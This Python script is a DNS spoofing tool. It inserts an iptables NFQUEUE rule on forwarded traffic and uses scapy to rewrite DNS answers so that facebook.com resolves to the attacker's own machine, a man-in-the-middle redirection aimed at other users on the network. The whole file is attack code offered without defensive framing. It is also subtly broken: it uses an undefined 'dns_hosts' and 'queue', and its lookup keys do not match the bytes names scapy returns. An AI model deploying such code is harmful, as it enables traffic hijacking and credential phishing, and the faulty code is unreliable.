import os
import logging as log
import platform

from netfilterqueue import NetfilterQueue
from utils import get_local_ip

from scapy.all import *



def add_routing_rule():
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

def remove_routing_rule():
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):

        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()

def modify_packet(packet):
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        print("no modification:", qname)
        return packet

    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])

    packet[DNS].ancount = 1

    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet

def start_dns_poisoning():
    hosts_dict = {
        "facebook.com": get_local_ip()
    }
    QUEUE_NUM = 0

    add_routing_rule()

    try:
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        remove_routing_rule()

def dns_poisoning_loop():
    pass

if __name__ == "__main__":
    start_dns_poisoning()